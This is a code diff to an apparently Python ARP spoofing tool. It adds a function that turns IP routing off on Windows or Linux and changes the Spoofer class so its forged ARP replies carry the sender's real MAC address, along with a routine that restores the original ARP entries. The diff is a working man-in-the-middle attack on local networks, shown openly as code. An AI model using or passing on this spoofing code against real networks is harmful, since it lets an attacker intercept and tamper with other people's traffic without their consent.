@@ -17,6 +17,21 @@ def enableIPRoute(os):
         exit()
 
 
+def disableIPRoute(os):
+    if os == "Windows":
+        from windows_ip_router import IP_Router
+        router = IP_Router()
+        router.stop()
+        print("IP routing disabled.")
+    elif os == "Linux":
+        from linux_ip_router import disable_linux_iproute
+        disable_linux_iproute()
+        print("IP routing disabled.")
+    else:
+        print("This code does not support the given OS :(")
+        exit()
+
+
 def getMac(ip, interface=None):
     # Initiates an ARP resolution between your machine and the target machine.
     # Tells the wifi router to ask "Who has <ip>? Respond with your MAC address."
@@ -49,16 +64,16 @@ class Spoofer:
         elif self.connection_mode == "eth":
             target_mac = getMac(target_ip)
 
-        spoofed_arp_ipv4 = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc="00:00:00:00:00:00", op=2)
+        spoofed_arp = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, op=2)
         
-        send(spoofed_arp_ipv4, verbose=1)
+        send(spoofed_arp, verbose=1)
         print("Spoofed ARP sent to IPv4", target_ip, "with MAC", target_mac)
         
 
     def unspoof(self, target_ip, real_ip):
         target_mac = getMac(target_ip)
         real_mac = getMac(real_ip)
-        unspoofing_arp_ipv4 = ARP(pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac, op=2)
-        send(unspoofing_arp_ipv4, verbose=1, count=7)
+        unspoofing_arp = ARP(pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac, op=2)
+        send(unspoofing_arp, verbose=1, count=7)
         print("Original ARPs restrored.")
 
